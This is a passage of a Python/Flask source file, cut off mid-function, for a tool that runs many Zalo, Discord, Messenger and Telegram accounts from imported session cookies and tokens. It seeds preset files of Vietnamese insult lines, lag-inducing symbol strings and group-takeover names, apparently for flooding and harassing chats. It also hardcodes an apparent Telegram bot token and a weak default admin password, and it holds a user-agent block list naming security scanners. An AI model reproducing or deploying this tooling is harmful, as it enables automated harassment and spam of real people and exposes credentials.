# ==============================================================================
# SIÊU HỆ THỐNG ĐIỀU PHỐI ĐA TÀI KHOẢN ZALO • DISCORD • MESSENGER • TELEGRAM
# Author : Dev Anh Khôi
# Version: v2026.11.0 Ultra VIP
# ==============================================================================
APP_AUTHOR = "Dev Anh Khôi"
APP_VERSION = "v2026.11.0 Ultra VIP"

import sys, types
try:
    import zalo_login as _zl_mod
except ImportError:
    _zl_mod = types.ModuleType("zalo_login")
    class LoginQRCallbackEventType:
        QRCodeGenerated = "QRCodeGenerated"
        QRCodeExpired = "QRCodeExpired"
        QRCodeScanned = "QRCodeScanned"
        QRCodeDeclined = "QRCodeDeclined"
        GotLoginInfo = "GotLoginInfo"
    _zl_mod.LoginQRCallbackEventType = LoginQRCallbackEventType
    sys.modules["zalo_login"] = _zl_mod

import os
import gc
import re
import ssl
import zlib
import gzip
import io
import json
import time
import uuid
import hmac
import math
import hashlib
import secrets
import sqlite3
import base64
import socket
import struct
import random
import threading
import unicodedata
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor
from functools import wraps
from urllib.parse import urlparse, unquote

import requests
from requests.adapters import HTTPAdapter
try:
    from Crypto.Cipher import AES
except ImportError:
    try:
        from Cryptodome.Cipher import AES
    except ImportError:
        from cryptography.hazmat.primitives.ciphers import Cipher as _Cipher, algorithms as _alg, modes as _modes
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AESGCM

        class AES:
            MODE_CBC = 2
            MODE_GCM = 11
            block_size = 16

            @staticmethod
            def new(key, mode, iv_or_nonce=None, nonce=None):
                if mode == 2:
                    iv = iv_or_nonce if iv_or_nonce is not None else bytes(16)
                    class _CBCWrap:
                        def __init__(self, k, i):
                            self._c = _Cipher(_alg.AES(k), _modes.CBC(i))
                        def encrypt(self, data):
                            enc = self._c.encryptor()
                            return enc.update(data) + enc.finalize()
                        def decrypt(self, data):
                            dec = self._c.decryptor()
                            return dec.update(data) + dec.finalize()
                    return _CBCWrap(key, iv)
                else:
                    nc = nonce if nonce is not None else iv_or_nonce
                    class _GCMWrap:
                        def __init__(self, k, n):
                            self._g = _AESGCM(k)
                            self._n = n
                            self._aad = b""
                        def update(self, aad):
                            self._aad += aad
                        def decrypt_and_verify(self, ct, tag):
                            return self._g.decrypt(self._n, ct + tag, self._aad or None)
                        def decrypt(self, ct):
                            return self._g.decrypt(self._n, ct, self._aad or None)
                    return _GCMWrap(key, nc)

try:
    from flask import (
        Flask, request, jsonify, session, redirect, Response, send_from_directory, render_template_string
    )
except ImportError:
    class Flask:
        def __init__(self, *a, **kw):
            self.config = {}
        def route(self, *a, **kw):
            return lambda fn: fn
        def errorhandler(self, *a, **kw):
            return lambda fn: fn
        def before_request(self, *a, **kw):
            return lambda fn: fn
        def after_request(self, *a, **kw):
            return lambda fn: fn
        def context_processor(self, *a, **kw):
            return lambda fn: fn
        def __getattr__(self, name):
            return lambda *a, **kw: (lambda fn: fn)
        def run(self, *a, **kw):
            pass
    class _DummyReq:
        path = ""
        method = "GET"
        args = {}
        form = {}
        files = {}
        headers = {}
        remote_addr = "127.0.0.1"
        is_json = False
        json = {}
    request = _DummyReq()
    redirect = lambda u: u
    render_template_string = lambda s, **kw: s
    session = {}
    jsonify = lambda *a, **kw: dict(*a, **kw) if a else kw
    send_from_directory = lambda *a, **kw: ""
    Response = lambda *a, **kw: a[0] if a else ""

try:
    from werkzeug.utils import secure_filename
except ImportError:
    def secure_filename(filename):
        return re.sub(r"[^a-zA-Z0-9_.\-]", "_", str(filename or "file.txt"))

# CẤU HÌNH HỆ THỐNG & BẢO MẬT WEB
APP_TITLE = "NHK"
APP_AUTHOR = "Dev Anh Khôi"
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8917587021:AAGnf2uUmNLI1r747luw8BVGi_hr3jBzWpw")
TELEGRAM_ADMIN_ID = os.environ.get("TELEGRAM_ADMIN_ID", "8827605973")
SECRET_KEY = os.environ.get("SECRET_KEY", "telegram-ultra-secure-session-key-2026-hmac-sha256")
ACCESS_KEY = os.environ.get("WEB_KEY", "anhba")
DEFAULT_ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
DEFAULT_ADMIN_PASS = os.environ.get("ADMIN_PASS", "anhba")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "database.db")
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
LOGO_DIR = os.path.join(UPLOAD_DIR, "brand")
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(LOGO_DIR, exist_ok=True)

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.config["MAX_CONTENT_LENGTH"] = 256 * 1024 * 1024
app.config["JSON_AS_ASCII"] = False
app.config["SEND_FILE_MAX_AGE_DEFAULT"] = 3600
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"

# LÁ CHẮN BẢO MẬT WEB (CHỐNG BRUTE-FORCE, RATE-LIMIT API, HEADERS)
LOGIN_ATTEMPTS = defaultdict(lambda: {"fails": 0, "lock_until": 0.0})
API_RATE_BUCKETS = defaultdict(lambda: deque(maxlen=260))
SECURITY_LOCK = threading.RLock()

def get_client_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or "127.0.0.1"

def check_ip_bruteforce(ip):
    now = time.time()
    with SECURITY_LOCK:
        st = LOGIN_ATTEMPTS[ip]
        if now < st["lock_until"]:
            return False, int(st["lock_until"] - now)
        return True, 0

def record_login_result(ip, success):
    now = time.time()
    with SECURITY_LOCK:
        st = LOGIN_ATTEMPTS[ip]
        if success:
            st["fails"] = 0
            st["lock_until"] = 0.0
        else:
            st["fails"] += 1
            if st["fails"] >= 8:
                st["lock_until"] = now + min(300, 20 * (st["fails"] - 7))

def hash_password_secure(raw_pw):
    salt = secrets.token_hex(8)
    h = hashlib.pbkdf2_hmac("sha256", raw_pw.encode("utf-8"), salt.encode("utf-8"), 100000).hex()
    return f"pbkdf2${salt}${h}"

def verify_password_secure(stored_pw, provided_pw):
    if not stored_pw or not provided_pw:
        return False
    if stored_pw.startswith("pbkdf2$"):
        parts = stored_pw.split("$")
        if len(parts) == 3:
            _, salt, h = parts
            calc = hashlib.pbkdf2_hmac("sha256", provided_pw.encode("utf-8"), salt.encode("utf-8"), 100000).hex()
            return hmac.compare_digest(h, calc)
    return hmac.compare_digest(str(stored_pw), str(provided_pw))

def get_or_create_csrf_token():
    tok = session.get("csrf_token")
    if not tok:
        tok = secrets.token_hex(24)
        session["csrf_token"] = tok
    return tok

@app.before_request
def security_middleware():
    if not WebSecurityFortress.inspect_request():
        return jsonify({"ok": False, "error": "Forbidden Request Signature"}), 403
    if request.path.startswith("/api/") or request.path.startswith("/task/"):
        ip = get_client_ip()
        now = time.time()
        with SECURITY_LOCK:
            dq = API_RATE_BUCKETS[ip]
            while dq and now - dq[0] > 10.0:
                dq.popleft()
            if len(dq) >= 320:
                return jsonify({"ok": False, "error": "Thao tác quá nhanh, vui lòng thử lại sau vài giây"}), 429
            dq.append(now)

class WebSecurityFortress:
    """Hệ thống tường lửa bảo mật Web đa lớp:
    - Chống vét cạn mật khẩu (IP Brute-Force Quarantine)
    - Chống ngập lụt API (Sliding-Window Rate Limiter)
    - Bảo vệ phiên Cookie (HttpOnly, SameSite=Lax, Constant-Time HMAC)
    - Tiêu đề bảo mật chuẩn quốc tế (Nosniff, Frame-Options, Permissions-Policy)"""
    BLOCKED_UA_KEYWORDS = ("sqlmap", "nikto", "acunetix", "nmap", "masscan", "dirbuster")

    @classmethod
    def inspect_request(cls):
        ua = (request.headers.get("User-Agent") or "").lower()
        for bad in cls.BLOCKED_UA_KEYWORDS:
            if bad in ua:
                return False
        return True

@app.after_request
def add_security_headers(resp):
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["X-Frame-Options"] = "SAMEORIGIN"
    resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    resp.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
    if request.path.startswith("/api/"):
        resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    return resp

# BỘ LỌC ẨN LOG TÀI KHOẢN NHẠY CẢM (STEALTH ACCOUNT LOG MASKING)
def mask_sensitive_id(val, keep_tail=3):
    s = str(val or "").strip()
    if not s:
        return "***"
    if len(s) <= keep_tail + 2:
        return "***"
    return f"***{s[-keep_tail:]}"

def mask_account_name(name):
    s = str(name or "").strip()
    if not s:
        return "Acc_***"
    if len(s) <= 3:
        return s[0] + "**"
    return f"{s[:2]}***{s[-1:]}"

def sanitize_log_text(txt):
    if not txt:
        return ""
    s = str(txt)
    s = re.sub(r"[A-Za-z0-9_\-]{23,28}\.[A-Za-z0-9_\-]{6,7}\.[A-Za-z0-9_\-]{27,45}", "[HIDDEN_TOKEN]", s)
    s = re.sub(r"(https?://[^\s]+)", "[STEALTH_ROUTE]", s)
    return s[:220]

# KHỞI TẠO & ĐỒNG BỘ CƠ SỞ DỮ LIỆU SQLITE TỐC ĐỘ CAO
_ACTIVE_DB_PATH = DB_PATH
_DB_TLS = threading.local()
_DB_WRITE_LOCK = threading.RLock()

class _PooledSQLiteConnection:
    """Kết nối SQLite tái sử dụng theo từng luồng (Thread-Local Connection Pool):
    - Loại bỏ 100% độ trễ mở file database.db và chạy PRAGMA lặp lại khi treo 100 luồng tần suất cao!"""
    def __init__(self, raw_conn):
        self._conn = raw_conn

    def execute(self, *args, **kwargs):
        return self._conn.execute(*args, **kwargs)

    def executemany(self, *args, **kwargs):
        return self._conn.executemany(*args, **kwargs)

    def cursor(self, *args, **kwargs):
        return self._conn.cursor(*args, **kwargs)

    def commit(self):
        with _DB_WRITE_LOCK:
            return self._conn.commit()

    def rollback(self):
        return self._conn.rollback()

    def close(self):
        # Giữ kết nối sống trong Thread-Local Pool, chỉ giải phóng khóa giao dịch nếu có
        try:
            if self._conn.in_transaction:
                with _DB_WRITE_LOCK:
                    self._conn.commit()
        except Exception:
            pass

    def __getattr__(self, name):
        return getattr(self._conn, name)

def _create_raw_sqlite_conn():
    global _ACTIVE_DB_PATH
    try:
        raw = sqlite3.connect(_ACTIVE_DB_PATH, timeout=30, check_same_thread=False)
        raw.row_factory = sqlite3.Row
        raw.execute("PRAGMA journal_mode=MEMORY;")
        raw.execute("PRAGMA synchronous=OFF;")
        raw.execute("PRAGMA temp_store=MEMORY;")
        raw.execute("PRAGMA busy_timeout=15000;")
        raw.execute("PRAGMA cache_size=-8000;")
        return raw
    except sqlite3.OperationalError:
        import tempfile
        _ACTIVE_DB_PATH = os.path.join(tempfile.gettempdir(), "noel_database.db")
        raw = sqlite3.connect(_ACTIVE_DB_PATH, timeout=30, check_same_thread=False)
        raw.row_factory = sqlite3.Row
        raw.execute("PRAGMA temp_store=MEMORY;")
        raw.execute("PRAGMA busy_timeout=15000;")
        return raw

def db():
    pooled = getattr(_DB_TLS, "conn", None)
    if pooled is not None and getattr(pooled, "_db_path", None) == _ACTIVE_DB_PATH:
        return pooled
    raw = _create_raw_sqlite_conn()
    pooled = _PooledSQLiteConnection(raw)
    pooled._db_path = _ACTIVE_DB_PATH
    _DB_TLS.conn = pooled
    return pooled

def normalize_zalo_cookies(raw_cookies):
    """Chuẩn hóa mọi định dạng Cookie Zalo (J2Team JSON, Extension JSON, EditThisCookie Array, Dict, Header String, File .txt)
    về Dict phẳng {str(k): str(v)} an toàn tuyệt đối cho cả CookieJar và Header Cookie (tự động loại bỏ 'EXPIRED')!"""
    try:
        from zalo_login import parse_cookies_input_flexible
        c_d = parse_cookies_input_flexible(raw_cookies)
        if c_d:
            return c_d
    except Exception:
        pass
    if not raw_cookies:
        return {}
    _bad_vals = ("deleted", "null", "none", "expired", "invalid", "false", "undefined", '""', "''")
    if isinstance(raw_cookies, dict):
        if "cookies" in raw_cookies and isinstance(raw_cookies["cookies"], (list, dict, str)):
            return normalize_zalo_cookies(raw_cookies["cookies"])
        out = {}
        for k, v in raw_cookies.items():
            if k and k not in ("url", "imei", "userAgent", "user_agent", "zpw_enk") and not isinstance(v, (list, dict)) and v is not None:
                val_s = str(v).strip()
                if val_s and val_s.lower() not in _bad_vals:
                    if str(k).strip().lower() in ("zpw_sek", "zpsid", "zpsidleg", "__zi") and len(val_s) < 12:
                        continue
                    out[str(k).strip()] = val_s
        return out
    if isinstance(raw_cookies, list):
        out = {}
        for c in raw_cookies:
            if isinstance(c, dict) and c.get("name") and c.get("value") is not None:
                val_s = str(c["value"]).strip()
                if val_s and val_s.lower() not in ("deleted", "null", "none", '""', "''"):
                    out[str(c["name"]).strip()] = val_s
        return out
    s = str(raw_cookies).strip()
    if not s:
        return {}
    try:
        parsed = json.loads(s)
        if isinstance(parsed, (dict, list)):
            return normalize_zalo_cookies(parsed)
    except Exception:
        pass
    out = {}
    for part in s.replace("\r", "\n").split(";"):
        for line_p in part.split("\n"):
            if "=" in line_p:
                k, v = line_p.strip().split("=", 1)
                k_s, v_s = k.strip(), v.strip().strip(",")
                if k_s and v_s and " " not in k_s and ":" not in k_s and v_s.lower() not in ("deleted", "null", "none"):
                    out[k_s] = v_s
    return out

def extract_imei_from_raw_input(imei_str, raw_cookies):
    """Bóc tách chính xác 100% IMEI (z_uuid) từ ô nhập IMEI, từ trong Cookie (z_uuid), hoặc từ file .txt xuất ra."""
    try:
        from zalo_login import extract_imei_and_metadata_flexible
        im_ext, ck_ext, _, _ = extract_imei_and_metadata_flexible(imei_str, raw_cookies)
        if im_ext:
            return im_ext
        if ck_ext.get("z_uuid"):
            return str(ck_ext["z_uuid"]).strip()
    except Exception:
        pass
    imei_clean = str(imei_str or "").strip()
    if imei_clean and not imei_clean.startswith("{") and "=" not in imei_clean and "\n" not in imei_clean:
        return imei_clean
    for candidate in (imei_str, raw_cookies):
        if not candidate:
            continue
        s_cand = str(candidate).strip()
        m_uuid = re.search(r"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}(?:-[0-9a-fA-F]{16,64})?)", s_cand)
        if m_uuid:
            return m_uuid.group(1).strip()
        try:
            parsed = json.loads(s_cand) if isinstance(candidate, str) else candidate
            if isinstance(parsed, dict):
                found_imei = parsed.get("imei") or parsed.get("z_uuid") or parsed.get("zpw_imei") or parsed.get("deviceId")
                if found_imei:
                    return str(found_imei).strip()
        except Exception:
            pass
    c_norm = normalize_zalo_cookies(raw_cookies or imei_str)
    if c_norm.get("z_uuid"):
        return str(c_norm["z_uuid"]).strip()
    return imei_clean

def normalize_messenger_cookies(raw_cookies):
    """Chuẩn hóa mọi định dạng Cookie Facebook / Messenger (J2Team JSON, EditThisCookie Array, Dict, Header String c_user=...; xs=...)
    về Dict phẳng {str(k): str(v)} an toàn tuyệt đối cho requests.Session!"""
    if not raw_cookies:
        return {}
    if isinstance(raw_cookies, dict):
        if "cookies" in raw_cookies and isinstance(raw_cookies["cookies"], (list, dict, str)):
            return normalize_messenger_cookies(raw_cookies["cookies"])
        out = {}
        for k, v in raw_cookies.items():
            if k and k not in ("url", "userAgent", "user_agent") and not isinstance(v, (list, dict)) and v is not None:
                out[str(k).strip()] = str(v).strip()
        return out
    if isinstance(raw_cookies, list):
        out = {}
        for c in raw_cookies:
            if isinstance(c, dict) and c.get("name") and c.get("value") is not None:
                out[str(c["name"]).strip()] = str(c["value"]).strip()
        return out
    s = str(raw_cookies).strip()
    if not s:
        return {}
    try:
        parsed = json.loads(s)
        if isinstance(parsed, (dict, list)):
            return normalize_messenger_cookies(parsed)
    except Exception:
        pass
    out = {}
    for part in s.split(";"):
        if "=" in part:
            k, v = part.strip().split("=", 1)
            if k.strip():
                out[k.strip()] = v.strip()
    return out

def extract_messenger_uid(raw_cookies, fallback_uid=""):
    c_dict = normalize_messenger_cookies(raw_cookies)
    uid = c_dict.get("c_user") or c_dict.get("i_user") or str(fallback_uid or "").strip()
    if not uid and isinstance(raw_cookies, str):
        m = re.search(r"(?:c_user|i_user)\s*=\s*(\d+)", raw_cookies)
        if m:
            uid = m.group(1)
    return str(uid or "").strip()

def init_db():
    global _ACTIVE_DB_PATH
    try:
        conn = db()
        try:
            conn.execute("PRAGMA journal_mode=MEMORY;")
        except Exception:
            pass
        conn.execute("CREATE TABLE IF NOT EXISTS _lock_test (id INT)")
    except sqlite3.OperationalError:
        import tempfile
        _ACTIVE_DB_PATH = os.path.join(tempfile.gettempdir(), "noel_database.db")
        _DB_TLS.conn = None
        conn = db()
    cur = conn.cursor()

    cur.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        created_at REAL
    )
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS accounts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        imei TEXT,
        cookies TEXT,
        platform TEXT DEFAULT 'zalo',
        token TEXT,
        is_bot INTEGER DEFAULT 0,
        uid TEXT DEFAULT '',
        chat_cmd_enabled INTEGER DEFAULT 1,
        cmd_prefix TEXT DEFAULT '.',
        allow_all_cmd INTEGER DEFAULT 1,
        enabled INTEGER DEFAULT 1,
        created_at REAL
    )
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS authorized_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        uid TEXT UNIQUE,
        name TEXT,
        added_by_acc INTEGER,
        added_at REAL
    )
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS app_settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS discord_token_vault (
        token_key TEXT PRIMARY KEY,
        launch_sig TEXT,
        hb_sess TEXT,
        dcfduid TEXT,
        sdcfduid TEXT,
        cfuvid TEXT,
        profile_idx INTEGER DEFAULT 0,
        session_id TEXT DEFAULT '',
        resume_url TEXT DEFAULT '',
        last_seq INTEGER DEFAULT 0,
        updated_at REAL
    )
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS zalo_cookie_vault (
        uid TEXT PRIMARY KEY,
        display_name TEXT DEFAULT '',
        imei TEXT DEFAULT '',
        cookies_json TEXT DEFAULT '{}',
        zpw_enk TEXT DEFAULT '',
        user_agent TEXT DEFAULT '',
        owner_tg_id TEXT DEFAULT '',
        updated_at REAL
    )
    """)
    try:
        cur.execute("ALTER TABLE zalo_cookie_vault ADD COLUMN owner_tg_id TEXT DEFAULT ''")
    except Exception:
        pass

    cur.execute("""
    CREATE TABLE IF NOT EXISTS messenger_cookie_vault (
        uid TEXT PRIMARY KEY,
        fb_dtsg TEXT DEFAULT '',
        jazoest TEXT DEFAULT '',
        lsd TEXT DEFAULT '',
        cookies_json TEXT DEFAULT '{}',
        user_name TEXT DEFAULT '',
        last_seq_id TEXT DEFAULT '',
        client_rev TEXT DEFAULT '1015919737',
        updated_at REAL
    )
    """)
    for m_col, m_sql in [
        ("last_seq_id", "ALTER TABLE messenger_cookie_vault ADD COLUMN last_seq_id TEXT DEFAULT ''"),
        ("client_rev", "ALTER TABLE messenger_cookie_vault ADD COLUMN client_rev TEXT DEFAULT '1015919737'"),
    ]:
        try:
            cur.execute(m_sql)
        except Exception:
            pass
    for d_col, d_sql in [
        ("boxes_json", "ALTER TABLE discord_token_vault ADD COLUMN boxes_json TEXT DEFAULT '[]'"),
        ("user_name", "ALTER TABLE discord_token_vault ADD COLUMN user_name TEXT DEFAULT ''"),
        ("user_id", "ALTER TABLE discord_token_vault ADD COLUMN user_id TEXT DEFAULT ''"),
    ]:
        try:
            cur.execute(d_sql)
        except Exception:
            pass

    cur.execute("PRAGMA table_info(accounts)")
    cols = [c[1] for c in cur.fetchall()]
    migrations = [
        ("platform", "ALTER TABLE accounts ADD COLUMN platform TEXT DEFAULT 'zalo'"),
        ("token", "ALTER TABLE accounts ADD COLUMN token TEXT"),
        ("is_bot", "ALTER TABLE accounts ADD COLUMN is_bot INTEGER DEFAULT 0"),
        ("uid", "ALTER TABLE accounts ADD COLUMN uid TEXT DEFAULT ''"),
        ("chat_cmd_enabled", "ALTER TABLE accounts ADD COLUMN chat_cmd_enabled INTEGER DEFAULT 1"),
        ("cmd_prefix", "ALTER TABLE accounts ADD COLUMN cmd_prefix TEXT DEFAULT '.'"),
        ("allow_all_cmd", "ALTER TABLE accounts ADD COLUMN allow_all_cmd INTEGER DEFAULT 1"),
        ("enabled", "ALTER TABLE accounts ADD COLUMN enabled INTEGER DEFAULT 1"),
        ("user_agent", "ALTER TABLE accounts ADD COLUMN user_agent TEXT DEFAULT ''"),
        ("zpw_enk", "ALTER TABLE accounts ADD COLUMN zpw_enk TEXT DEFAULT ''"),
        ("pc_name", "ALTER TABLE accounts ADD COLUMN pc_name TEXT DEFAULT ''"),
        ("owner_tg_id", "ALTER TABLE accounts ADD COLUMN owner_tg_id TEXT DEFAULT ''"),
    ]
    for col_name, sql_stmt in migrations:
        if col_name not in cols:
            try:
                cur.execute(sql_stmt)
            except Exception:
                pass

    cur.execute("""
    CREATE TABLE IF NOT EXISTS files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        filename TEXT,
        filepath TEXT,
        lines_count INTEGER,
        created_at REAL,
        file_type TEXT DEFAULT 'nhay'
    )
    """)
    try:
        f_cols = [c[1] for c in cur.execute("PRAGMA table_info(files)").fetchall()]
        if "file_type" not in f_cols:
            cur.execute("ALTER TABLE files ADD COLUMN file_type TEXT DEFAULT 'nhay'")
    except Exception:
        pass

    cur.execute("""
    CREATE TABLE IF NOT EXISTS tasks (
        id TEXT PRIMARY KEY,
        type TEXT,
        meta TEXT,
        status TEXT,
        started_at REAL,
        stats TEXT
    )
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS bot_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        acc_id INTEGER,
        thread_id TEXT,
        sender_id TEXT,
        cmd_text TEXT,
        action_taken TEXT,
        created_at REAL
    )
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS cmd_execution_locks (
        lock_key TEXT PRIMARY KEY,
        created_at REAL
    )
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS zalo_qr_sessions (
        session_id TEXT PRIMARY KEY,
        state_json TEXT DEFAULT '{}',
        qr_png BLOB,
        updated_at REAL
    )
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS system_epochs (
        epoch_key TEXT PRIMARY KEY,
        epoch_val INTEGER DEFAULT 0,
        updated_at REAL
    )
    """)

    try:
        cur.execute("UPDATE accounts SET chat_cmd_enabled = 1 WHERE chat_cmd_enabled IS NULL")
        cur.execute("UPDATE accounts SET allow_all_cmd = 1 WHERE allow_all_cmd IS NULL")
        # Tự động nạp sẵn 8 kho kịch bản VIP từ 3 file zip (nhay.txt, so.txt, chui.txt, codelag.txt, nhayicon.txt, nhaynamebox.txt, ngon.txt, 2c.txt)
        presets_dir = os.path.join(BASE_DIR, "presets")
        default_preset_contents = {
            "nhay.txt": "Sủa mạnh lên con chó ngu\nMày sợ bố à con đĩ\nLên phím nhanh lên con gà\nBố đè đầu cưỡi cổ mày nè\nChạy đi đâu con sâu cái kiến\nNgồi im nghe bố giảng đạo lý\nBố chấp cả lò nhà mày luôn",
            "so.txt": "1\n2\n3\n4\n5\n6\n7\n8\n9\n10",
            "chui.txt": "Mày tuổi gì đú với bố\nNằm xuống sủa gâu gâu đi con\nThằng óc vật biết gõ phím không\nBố vả lệch mõm mày giờ",
            "codelag.txt": "꧁༺💥⚡🔥👑🔥⚡💥༻꧂\n۞۩๑🔥⚡👑⚡🔥๑۩۞",
            "nhayicon.txt": "🔥 ⚡ 👑 💀 ☠️ 😈 💥 🚀\n🌪️ 🐉 ⚔️ 🛡️ 🔥 ⚡ 👑 💥",
            "nhaynamebox.txt": "Box Bị Chiếm Đóng 🔥\nHệ Thống Quản Trị Viên 👑\nTrùm Cuối Zalo VIP ⚡\nĐế Chế Tối Thượng 🚀\nKhu Vực Cấm Địa 🛡️",
            "ngon.txt": "Hệ Thống Đa Luồng Siêu Tốc\nĐẳng cấp tốc độ ánh sáng, cân mọi chiến trường không độ trễ!\nTường lửa Anti-Ban bảo vệ toàn diện 24/7!",
            "2c.txt": "Câu 1 vả thẳng mặt\nCâu 2 đè bẹp dí\nCâu 3 tiễn lên đường\nCâu 4 khóa mõm toàn tập",
        }
        import shutil
        existing_fnames = {r["filename"].lower() for r in cur.execute("SELECT filename FROM files").fetchall() if r["filename"]}
        for pf_name, def_txt in default_preset_contents.items():
            src_pf = os.path.join(presets_dir, pf_name)
            dst_pf = os.path.join(UPLOAD_DIR, f"preset_{pf_name}")
            dst_plain = os.path.join(UPLOAD_DIR, pf_name)
            if os.path.isfile(src_pf):
                if not os.path.isfile(dst_pf):
                    shutil.copyfile(src_pf, dst_pf)
                if not os.path.isfile(dst_plain):
                    shutil.copyfile(src_pf, dst_plain)
            else:
                if not os.path.isfile(dst_pf):
                    with open(dst_pf, "w", encoding="utf-8") as wf:
                        wf.write(def_txt)
                if not os.path.isfile(dst_plain):
                    with open(dst_plain, "w", encoding="utf-8") as wf:
                        wf.write(def_txt)
            if pf_name.lower() not in existing_fnames and os.path.isfile(dst_pf):
                with open(dst_pf, "r", encoding="utf-8", errors="ignore") as rf_p:
                    l_cnt = sum(1 for ln in rf_p if ln.strip())
                pf_type = "ngon" if "ngon" in pf_name.lower() else "nhay"
                cur.execute(
                    "INSERT INTO files (filename, filepath, lines_count, created_at, file_type) VALUES (?, ?, ?, ?, ?)",
                    (pf_name, dst_pf, max(1, l_cnt), time.time(), pf_type)
                )
        z_rows = cur.execute("SELECT id, imei, cookies FROM accounts WHERE platform='zalo'").fetchall()
        for zr in z_rows:
            norm_c = normalize_zalo_cookies(zr["cookies"])
            norm_imei = extract_imei_from_raw_input(zr["imei"], zr["cookies"])
            if norm_c:
                cur.execute(
                    "UPDATE accounts SET imei=?, cookies=? WHERE id=?",
                    (norm_imei, json.dumps(norm_c, ensure_ascii=False), zr["id"])
                )
    except Exception:
        pass

    existing_admin = cur.execute("SELECT id FROM users WHERE username = ?", (DEFAULT_ADMIN_USER,)).fetchone()
    if not existing_admin:
        cur.execute(
            "INSERT INTO users (username, password, created_at) VALUES (?, ?, ?)",
            (DEFAULT_ADMIN_USER, hash_password_secure(DEFAULT_ADMIN_PASS), time.time())
        )

    conn.commit()
    conn.close()

init_db()

def get_setting(key, default_val=""):
    try:
        conn = db()
        row = conn.execute("SELECT value FROM app_settings WHERE key = ?", (key,)).fetchone()
        conn.close()
        return row["value"] if row else default_val
    except Exception:
        return default_val

def set_setting(key, val):
    try:
        conn = db()
        conn.execute("INSERT OR REPLACE INTO app_settings (key, value) VALUES (?, ?)", (key, str(val)))
        conn.commit()
        conn.close()
    except Exception:
        pass

# TRẠNG THÁI RUNTIME TOÀN CỤC & CHỐNG TỰ KÍCH HOẠT LỆNH (.MENU FIX)
ACTIVE_TASKS = {}
ACTIVE_LISTENERS = {}

# BỘ NHỚ RAM TỐC ĐỘ ÁNH SÁNG (0MS LOCK-FREE IN-MEMORY ENGINE CHO 100+ LUỒNG TREO)
ACCOUNTS_RAM_CACHE = {}
ACCOUNTS_RAM_LOCK = threading.RLock()
TASKS_RAM_STORE = {}
TASKS_RAM_LOCK = threading.RLock()
BOT_LOGS_RAM_DEQUE = deque(maxlen=40)

_LAST_ACCOUNTS_SYNC_TS = 0.0

def refresh_accounts_ram_cache():
    global _LAST_ACCOUNTS_SYNC_TS
    try:
        conn = db()
        rows = conn.execute("SELECT * FROM accounts ORDER BY id DESC").fetchall()
        new_map = {}
        bad_uid_ids = []
        for r in rows:
            d = dict(r)
            if (d.get("platform") or "zalo").lower() == "zalo":
                u_val = str(d.get("uid") or "").strip()
                if u_val and (not u_val.isdigit() or u_val == str(d.get("imei") or "").strip()):
                    d["uid"] = ""
                    bad_uid_ids.append((d["id"],))
            new_map[d["id"]] = d
        if bad_uid_ids:
            try:
                conn.executemany("UPDATE accounts SET uid='' WHERE id=?", bad_uid_ids)
                conn.commit()
            except Exception:
                pass
        conn.close()
        with ACCOUNTS_RAM_LOCK:
            ACCOUNTS_RAM_CACHE.clear()
            ACCOUNTS_RAM_CACHE.update(new_map)
            _LAST_ACCOUNTS_SYNC_TS = time.time()
        return list(new_map.values())
    except Exception:
        with ACCOUNTS_RAM_LOCK:
            return list(ACCOUNTS_RAM_CACHE.values())

def get_account_from_ram_by_id(acc_id):
    return get_account_from_ram(acc_id)


def get_account_from_ram(acc_id):
    if time.time() - _LAST_ACCOUNTS_SYNC_TS > 0.25:
        refresh_accounts_ram_cache()
    with ACCOUNTS_RAM_LOCK:
        acc = ACCOUNTS_RAM_CACHE.get(int(acc_id) if str(acc_id).isdigit() else acc_id)
        if acc is not None:
            return dict(acc)
    refresh_accounts_ram_cache()
    with ACCOUNTS_RAM_LOCK:
        acc = ACCOUNTS_RAM_CACHE.get(int(acc_id) if str(acc_id).isdigit() else acc_id)
        return dict(acc) if acc is not None else None

def get_all_accounts_from_ram(platform=None, enabled_only=False):
    if time.time() - _LAST_ACCOUNTS_SYNC_TS > 0.25 or not ACCOUNTS_RAM_CACHE:
        refresh_accounts_ram_cache()
    with ACCOUNTS_RAM_LOCK:
        items = list(ACCOUNTS_RAM_CACHE.values())
    if platform:
        items = [a for a in items if (a.get("platform") or "zalo").lower() == platform.lower()]
    if enabled_only:
        en = [a for a in items if a.get("enabled", 1)]
        items = en if en else items
    return [dict(a) for a in items]

GLOBAL_STOP_EPOCH = 0
BOX_STOP_EPOCHS = defaultdict(int)
STOP_EPOCH_LOCK = threading.RLock()

def _sync_epochs_from_db_background():
